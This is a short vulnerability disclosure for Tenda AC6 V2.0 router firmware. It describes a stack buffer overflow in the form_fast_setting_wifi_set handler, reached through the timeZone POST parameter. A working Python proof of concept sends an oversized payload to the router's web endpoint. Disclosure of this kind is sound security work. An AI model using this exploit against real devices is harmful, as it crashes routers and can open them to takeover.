# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "form_fast_setting_wifi_set"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

In the `form_fast_setting_wifi_set` function, users can craft a POST request to freely pass the **`timeZone` parameter** to the backend. This parameter is then processed by `sscanf`, which directly writes it into the **stack-allocated variable `timespand[2][4]`**. Given the small size of `timespand` (only 4 bytes per sub-array), this readily leads to a **stack overflow**.

![image-20250618171025773](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618171025773.png)

poc

```python
import requests
def send_payload(url, payload):
    params={
            'ssid':'1',
            'timeZone':payload,
            }
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x200+b':'+b'a'*0x200+b'\n'
url="http://192.168.1.1/goform/fast_setting_wifi_set"
send_payload(url, payload)   
```

![image-20250618170927278](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618170927278.png)